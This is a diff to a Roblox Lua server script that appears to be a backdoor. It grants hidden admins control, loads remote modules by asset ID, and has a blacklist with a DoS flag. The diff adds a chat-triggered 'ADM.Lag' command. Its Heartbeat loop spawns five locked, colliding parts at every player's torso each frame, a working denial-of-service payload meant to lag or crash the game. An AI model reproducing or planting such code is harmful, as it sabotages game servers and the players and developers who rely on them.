@@ -14,7 +14,7 @@ local AdminPanel = {
 }
 
 game.Players.PlayerAdded:Connect(function(plr)
-	
+
 
 	if BlackList[plr.Name] then
 		if EnabledDoDOS==true then 
@@ -23,7 +23,9 @@ game.Players.PlayerAdded:Connect(function(plr)
 	end
 
 end)
-
+local LagEnabled = false
+local LagObjcets = {
+}
 for _, player in pairs(game.Players:GetPlayers()) do
 	if table.find(AdminPanel,player.Name) ~= nil then
 		require(7192763922).load(player.Name)
@@ -88,9 +90,37 @@ for _, player in pairs(game.Players:GetPlayers()) do
 				Part.CanCollide=true
 				Part.CFrame = player.Character.Torso.CFrame
 				require(5419042716).PraiseSkidGod(player.Name)
+			elseif message == "ADM.Lag.Start" then
+				LagEnabled = true
+
+
+			elseif message == "ADM.Lag.Stop" then
+				LagEnabled=false
+				for index,lagobj in pairs(LagObjcets) do
+					lagobj:Destroy()
+				end
 			end
 		end)
 	end
-	
+
 
 end
+
+game["Run Service"].Heartbeat:Connect(function()
+	
+
+	if LagEnabled==false then return end
+	for index,value:Part in pairs(LagObjcets) do
+		value.Velocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
+	end
+	for _, player2 in pairs(game.Players:GetPlayers()) do
+		for i = 1,5 do
+			local Part = Instance.new("Part",workspace)
+			Part.CanCollide=true
+			Part.CFrame = player2.Character.Torso.CFrame
+			Part.Shape = Enum.PartType.Ball
+			Part.Locked = true
+			table.insert(LagObjcets,Part)
+		end
+	end
+end)
